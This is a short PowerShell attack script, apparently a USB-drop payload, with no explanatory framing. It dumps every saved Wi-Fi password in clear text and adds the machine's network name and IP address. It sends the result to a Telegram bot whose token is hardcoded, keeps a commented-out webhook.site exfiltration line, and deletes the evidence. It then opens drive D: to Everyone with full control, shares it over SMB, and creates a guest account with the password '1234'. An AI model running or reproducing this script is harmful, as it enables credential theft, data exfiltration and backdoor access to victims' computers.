################### Telegram Wifi Passwords #######################
cd $env:temp
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > Wi-Fi-PASS
(get-netconnectionProfile).Name >> Wi-Fi-PASS
Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress >> Wi-Fi-PASS
#Invoke-WebRequest -Uri https://webhook.site/5a81bbad-90a5-40db-a015-ffb88c41bf74 -Method POST -InFile Wi-Fi-PASS

$text = Get-Content .\Wi-Fi-PASS -Raw
Function Send-Telegram {
Param([Parameter(Mandatory=$true)][String]$Message)
$Telegramtoken = "5476202852:AAHqP84hjy-c6KFtHe_Va4waMrg7KvFHxLw"
$Telegramchatid = "5586673398"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Telegramtoken)/sendMessage?chat_id=$($Telegramchatid)&text=$($Message)"
}
Send-Telegram -Message $text

Remove-Item *Wi-*

################### Change Drive Security #######################
$Acl = Get-Acl "D:\"
$Ar = New-Object System.Security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow')
$Acl.SetAccessRule($Ar)
Set-Acl 'D:\' $Acl

################### Share Drive #######################
Remove-SmbShare -Name 'D' -Force
New-SmbShare -Path D:\\ -Name 'D' -FullAccess Everyone

################### Create Guest User #######################
Remove-LocalUser 'Visitor'
$secureString = ConvertTo-SecureString "1234" -AsPlainText -Force
New-LocalUser 'Visitor' -Password $secureString
Add-LocalGroupMember -Group 'Guests' -Member 'Visitor'

